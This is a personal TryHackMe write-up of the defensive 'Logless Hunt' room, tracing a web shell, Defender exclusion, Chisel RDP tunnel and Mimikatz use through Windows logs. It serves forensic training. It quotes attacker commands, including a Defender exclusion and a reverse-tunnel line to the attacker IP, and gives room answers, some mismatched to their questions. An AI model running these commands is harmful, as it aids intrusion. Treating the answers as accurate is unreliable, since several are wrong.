<p align="center">May 3, 2025<br>
Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{362}}$$-day-streak in  <a href="https://tryhackme.com">TryHackMe</a>.<br><br>
<img width="300px" src="https://github.com/user-attachments/assets/a05d8b96-0b6f-433d-ad76-00200da7298a" alt="Your Image Badge"><br>
<img width="200px" src="https://github.com/user-attachments/assets/93512cf9-8443-4639-8359-18137e0dd1c3"><br></p>

<h1 align="center">$$\textcolor{#3bd62d}{\textnormal{Logless Hunt}}$$</h1>
<p align="center">Detect every attack step on a Windows machine even after threat actors cleared Security logs.<br>
It is classified a medium-level walkthrough, , and you can join it for 🆓 using your own virtual machine with openVPN or TryHackMe´s AttackBox if you are subscribed. Can be accessed clicking <a href="https://tryhackme.com/room/loglesshunt">here</a>.</p>


<p align="center"> <img width="900px" src="https://github.com/user-attachments/assets/b6916bf7-2f29-41c9-9805-ce569bc937d6"> </p>

<br>

<h2>Task 1 . Introduction</h2>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>

> 1.1. <em>Let´s begin</em>.<a id='1.1'></a>
>> <code><strong>No answer needed</strong></code><br><br>

<br>
<br>

<h2>Task 2 . Scenario</h2>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>

> 2.1. <em>After launching the VM, open Event Viewer. What is the earliest Event ID you see in the Security logs?</em>.<a id='2.1'></a>
>> <code><strong>1102</strong></code><br><br>


<br>

![image](https://github.com/user-attachments/assets/1d4c3a1d-b556-49ba-afd1-4dcc399a0756)


<br>

![image](https://github.com/user-attachments/assets/92013c6e-76b4-4931-96ca-99078596e692)

<br>

![image](https://github.com/user-attachments/assets/8a3a7056-d54c-4540-b883-ce05d38db537)


<br>
<br>



<h2>Task 3 . Scenario</h2>


<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

> 3.1. <em>What is the title of the HR01-SRV web app hosted on 80 port?</em>.<a id='3.1'></a>
>> <code><strong>Salary Raise Approver v0.1</strong></code><br>


<br>

![image](https://github.com/user-attachments/assets/8911d2e4-bac0-4528-afd1-9a56f54fdfd4)


<br>

> 3.2. <em>Which IP performed an extensive web scan on the HR01-SRV web app?</em>.<a id='3.2'></a>
>> <code><strong>10.10.23.190</strong></code><br>


<br>

![image](https://github.com/user-attachments/assets/a7fade1d-c0a1-4d97-9605-057ad3a5bd5f)



<br>

> 3.3. <em>What is the absolute path to the file that the suspicious IP uploaded?</em>.<a id='3.3'></a>
>> <code><strong>C:\Apache24\htdocs\uploads\search.php</strong></code><br>

<br>

![image](https://github.com/user-attachments/assets/afdd8fb6-1fed-43a3-9119-ae939c23108e)

<br>

> 3.4. <em>Clearly, that's suspicious! What would you call the uploaded malware / backdoor?</em> Hint : <em>Note how the file is then repeatedly used by the attacker to achieve code execution.</em><br><a id='3.3'></a>
>> <code><strong>Web Shell</code><br>

<br>

![image](https://github.com/user-attachments/assets/414d7bdd-2e0d-442f-b62d-5c59776599c2)

<br>
<br>



<h2>Task 4 . From Web to RDP | PowerShell Logs</h2>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

> 4.1. <em>What was the first command entered by the attacker?</em>.<a id='4.1'></a>
>> <code><strong>whoami</strong></code><br>

<br>

![image](https://github.com/user-attachments/assets/21995adc-8920-4a1d-8bcc-423e67d97bdb)

<br> 

> 4.2. <em>What is the full URL of the file that the attacker attempted to download?</em>.<a id='4.2'></a>
>> <code><strong>http://10.10.23.190:8080/httpd-proxy.exe</strong></code><br>

<br>

![image](https://github.com/user-attachments/assets/1a30f473-d0b6-4d9e-96c8-83793686d80d)

<br>

> 4.3. <em>What command was run to exclude the file from Windows Defender?</em>.<a id='4.3'></a>
>> <code><strong>Add-MpPreference -ExclusionPath C:\Apache24</strong></code><br>

<br>

![image](https://github.com/user-attachments/assets/7b46b75a-6caf-49fb-a579-a5117dd02007)


<br>

> 4.4. <em></em>.<a id='4.4'></a>
>> <code><strong>RDP</strong></code><br>

<br>

![image](https://github.com/user-attachments/assets/4f78f2d7-7a87-463d-850b-5ab445e27400)


<br>
<br>

<h2>Task 5 . Breached Admin | RDP Session Logs</h2>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

> 5.1. <em>What was the first command entered by the attacker?</em>.<a id='5.1'></a>
>> <code><strong>2025-01-23 17:00:12</strong></code><br>

<br>

![image](https://github.com/user-attachments/assets/facf47fb-9070-4993-b3c5-365a3e98597f)

<br>


> 5.2. <em>What user did the attacker breach? (format: HOSTNAME\USER)</em>.<a id='5.2'></a>
>> <code><strong>HR01-SRV\Administrator</strong></code><br>

<br>

![image](https://github.com/user-attachments/assets/bdf37209-049c-4504-b0fc-93ab38baff32)

<br>

> 5.3. <em>What IP is shown as the source of the RDP login?</em>.<a id='5.3'></a>
>> <code><strong>10.10.23.190</strong></code><br>

<br>

![image](https://github.com/user-attachments/assets/18e52dd7-c19d-4914-b362-cf2c1e5bffb9)

<br>

> 5.4. <em>What is the timestamp when the attacker disconnected from RDP? (format: 2025-01-05 15:30:45)</em>.<a id='5.3'></a>
>> <code><strong>2025-01-23 17:16:46</strong></code><br>

<br>

![image](https://github.com/user-attachments/assets/c1419260-f966-420f-8579-557d330228d6)

<br>
<br>

<h2>Task 6 . Persistance Traces | Scheduled Tools</h2>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

> 6.1. <em>What is the name of the suspicious scheduled task?</em>. Hint : <em>Correlate task creation time with the incident timeline.</em><a id='6.1'></a>
>> <code><strong>Apache Proxy</strong></code><br>

<br>

<p>- RDP login : <code>2025-01-23 17:00:12</code><br><br>
-  Registered Scheduler Task: <code>2025-01-23 17:05:37</code>code><br><br>
- RDP logon: <code>2025-01-23 17:16:46</code></p>

<br>

![image](https://github.com/user-attachments/assets/e11846ae-84fc-486d-b780-aa50ad9ff36f)

> 6.2. <em>When was the suspicious scheduled task created? (format: 2025-01-05 15:30:45)</em></em><a id='6.2'></a>
>> <code><strong>2025-01-23 17:05:37</strong></code><br>

<br> 

![image](https://github.com/user-attachments/assets/829ed0c4-b65b-41b5-b4f0-c63013477322)

<br>


> 6.3. <em>What is the task's "Trigger" value as shown in Task Scheduler GUI?</em></em><a id='6.3'></a>
>> <code><strong>At system startup</strong></code><br>

<br> 

![image](https://github.com/user-attachments/assets/69a29180-12df-4790-9f43-1a7d36f36a10)

<br>

![image](https://github.com/user-attachments/assets/95391437-6d35-4413-9ab2-0537451484f7)


<br>


> 6.4. <em>What is the full command line of the malicious task?</em></em><a id='6.4'></a>
>> <code><strong>C:\Apache24\bin\httpd-proxy.exe client 10.10.23.190:10443 R:3389:127.0.0.1:3389</strong></code><br>

<br>

![image](https://github.com/user-attachments/assets/ffad2d4b-58ec-4e4e-9f24-5173eb0e6f12)

<br>
<br>




<h2>Task 7 . Credentials Access | Windows Defender</h2>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

> 7.1. <em>What is the threat family ("Name") of the first quarantined file? </em>.<a id='7.1'></a>
>> <code><strong>VirTool:Win64/Chisel.G</strong></code><br>

<br>

![image](https://github.com/user-attachments/assets/080e8186-16ee-4e01-8a71-fe7da913b321)


<br>

![image](https://github.com/user-attachments/assets/7efd9e7f-ac3e-4e74-867a-c98142bce0b4)

<br>

> 7.2. <em>And what is the threat family of the next detected malware?</em>.<a id='7.2'></a>
>> <code><strong>HackTool:Win32/Mimikatz!pz</strong></code><br>

<br>

![image](https://github.com/user-attachments/assets/bbda7b9a-c01c-420a-b7fc-28c0a95d33fb)


<br>

> 7.3. <em>What is the file name of the downloaded Mimikatz executable?</em>.<a id='7.2'></a>
>> <code><strong>mimi.exe</strong></code><br>

<br>

![image](https://github.com/user-attachments/assets/7d4c0d68-5c93-49f0-bf9c-284aee5bb061)

<br>

> 7.4. <em>Finally, which Mimikatz command was used to extract hashes from LSASS memory?</em>. Hint: <em>Time to get back to PowerShell logs!</em><a id='7.2'></a>
>> <code><strong>mimi.exe</strong></code><br>

<br>

![image](https://github.com/user-attachments/assets/17633297-699a-4cc0-9e9f-8a5a1adf1dc2)


<br>
<br>

<h2>Task 8 . Conclusion</h2>
<h3>Conclusion</h3>
<p>And what was next? What did the adversary find in the Mimikatz dump? Was there any further lateral movement? Likely yes! But for now, let's return to the customer and see what they can say about the findings on HR01-SRV. Other servers have already recovered, and there will be much more work to do soon, perhaps without any logs at all!<br><br>

In summary, in this room we covered:<br><br>

- Basics of web access logs and their use in detecting web shell upload and usage<br>
- Three types of PowerShell logs, their differences, and use in tracking malicious actions<br>
- RDP session logs as a simpler, more compact alternative to the Security 4624 event ID<br>
- Task scheduler logs, their use to build execution timeline of scheduled tasks<br>
- Windows Defender logs, their use in malware detection and classification</p>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

> 8.1. <em>Hope you enjoyed this room! </em>.<a id='8.1'></a>
>> <code><strong>No answer needed</strong></code><br>

<br>
<br>

<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{Room Completed}}$$</h1>
<br>

<p align="center">
<img width="1000px" src="https://github.com/user-attachments/assets/638b317c-20e9-49ea-9d2c-91617db0a538"><br>
<img width="1000px" src="https://github.com/user-attachments/assets/d7bf5131-af88-467e-a927-c68951968fa4"></p>


<br>

<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{My TryHackMe Journey}}$$ </h1>
<br>


<div align="center">

|       Date        |   Streak |   All Time   |   All Time   |   Monthly   |   Monthly  |  Points  |   Rooms   |   Badges  |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
|    May 3, 2025    |    362   |     238ᵗʰ    |      6ᵗʰ     |     371ˢᵗ   |     5ᵗʰ    |  99,411  |    705   |     60    |

</div>

<br>


<p align="center"> Global All Time: 238ᵗʰ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/ca3fa11f-3ca4-4b3b-9cdb-9bc98da4b8df"> </p>

<p align="center"> Brazil All Time:   6ᵗʰ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/cb35fa39-6081-4b73-a8fc-2876f7bfa9c2"> </p>

<p align="center"> Global monthly:  371ˢᵗ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/c2e223e0-974b-4dc8-b9e9-a5fca1249528"> </p>

<p align="center"> Brazil monthly:    5ᵗʰ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/151c6579-9a21-4ed3-ac0d-2a487a65c0d8"> </p>

<br>
<br>


<p align="center"> Weekly League:    10ᵗʰ Platinum<br><br><img width="1000px" src="https://github.com/user-attachments/assets/fd8c4162-6923-4a85-a004-83e70c070e4a"> </p>

<br>
<br>

<h1 align="center">$$\textcolor{#3bd62d}{\textnormal{Thanks for coming!!!}}$$</h1>

<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 

<br>

<h1 align="center">$$\textcolor{#3bd62d}{\textnormal{Thank you}}$$</h1>
<p align="center"><a href="https://tryhackme.com/p/tryhackme">tryhackme</a>  and <a href="https://tryhackme.com/p/TactfulTurtle">TactfulTurtle</a> for investing your time and effort to develop this walkthrough so that I could sharpen my skills!</p>
